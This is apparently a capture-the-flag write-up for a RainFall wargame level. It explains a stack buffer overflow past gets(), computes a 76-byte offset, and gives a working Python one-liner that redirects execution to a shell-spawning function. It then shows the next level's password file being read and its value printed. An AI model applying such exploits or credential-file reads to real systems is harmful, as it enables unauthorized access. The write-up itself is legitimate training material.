this is a simple buffer overflow where we overwrite the return adress of `main` to jump to `run` function :

```x86asm
   0x08048486 <+6>:	    sub    esp,0x50 
   0x08048489 <+9>:	    lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
```

```
[lower addresses]
+-------------------+
| [esp+0x00]        | <- start of stack frame
|                   |
| [esp+0x10]        | <- start of buffer used in gets
|                   |    (where we will use the buffer overflow)
|                   |
+-------------------+
| saved ebp         | <- saved ebp
+-------------------+
| saved eip         | <- return address
+-------------------+
[higher addresses]
```

since the stack frame is of size `0x50 (80)` and the buffer starts at `0x10 (16)`, then it's a matter of simple calculation :

```
80 (size of stack frame) + (stack alignment) - 16 (offset to buffer start) + 4 (size of ebp) = 76
```

```bash
0x080482f8  _init
0x08048340  gets@plt
0x08048350  fwrite@plt
0x08048360  system@plt
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run # this is the function we want to reach
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

since we can reach and overwrite the return address of `main` we can write the address of `run` function :

```bash
level1@RainFall:~$ (python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1]'; cat) | ./level1 
Good... Wait what?
whoami	
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

and there you go, you got the flag.